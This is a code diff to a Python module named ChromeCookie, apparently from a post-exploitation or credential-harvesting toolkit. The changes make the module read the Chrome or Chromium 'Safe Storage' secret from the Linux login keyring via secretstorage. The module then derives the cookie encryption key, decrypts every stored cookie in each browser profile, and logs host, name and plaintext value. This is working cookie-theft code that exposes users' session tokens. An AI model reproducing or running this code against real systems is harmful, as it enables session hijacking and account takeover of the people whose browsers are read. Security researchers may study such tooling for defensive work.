@@ -5,6 +5,7 @@ try:
 	import sqlite3
 	from Crypto.Cipher import AES
 	from hashlib import pbkdf2_hmac
+	import secretstorage
 except ImportError:
 	pass
 
@@ -16,9 +17,9 @@ class ChromeCookie(ChromeModule):
 		ChromeModule.__init__(
 			self,
 			name='ChromeCookie',
-			version='0.0.1',
+			version='0.1.1',
 			file=__file__,
-			dependencies=['os', 'sqlite3', 'Crypto', 'hashlib'],
+			dependencies=['os', 'sqlite3', 'Crypto', 'hashlib', 'secretstorage'],
 		)
 
 	def can(self):
@@ -31,9 +32,23 @@ class ChromeCookie(ChromeModule):
 		if not super().execute():
 			return False
 
+		bus = secretstorage.dbus_init()
+		collection = secretstorage.get_any_collection(bus)  ## login keyring
+
+		# Set the default linux password
+		# https://github.com/n8henrie/pycookiecheat/issues/27
+		my_pass = "peanuts"
+		if not collection.is_locked():
+			poss = ['Chrome', 'Chromium']
+			items1 = collection.get_all_items()
+			for item in items1:
+				for pos in poss:
+					if item.get_label() == f"{pos} Safe Storage":
+						my_pass = item.get_secret()
+
 		enc_key = pbkdf2_hmac(
 			hash_name='sha1',
-			password='peanuts'.encode('utf8'),
+			password=my_pass.encode('utf8') if type(my_pass) == str else my_pass,
 			salt=b'saltysalt',
 			iterations=1,
 			dklen=16
@@ -45,7 +60,11 @@ class ChromeCookie(ChromeModule):
 				self.log(profile.split('/')[-1] + ':')
 				connection = sqlite3.connect(cookie_path)
 				cursor = connection.cursor()
-				cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
+				try:
+					cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
+				except sqlite3.OperationalError:
+					self.executenot(cookie_path + ' database is locked', 1)
+					return False
 
 				for host_key, name, value, encrypted_value in cursor.fetchall():
 					self.log(host_key + ',' + name + ',' + str(value if value else self.decrypt(encrypted_value, enc_key)))
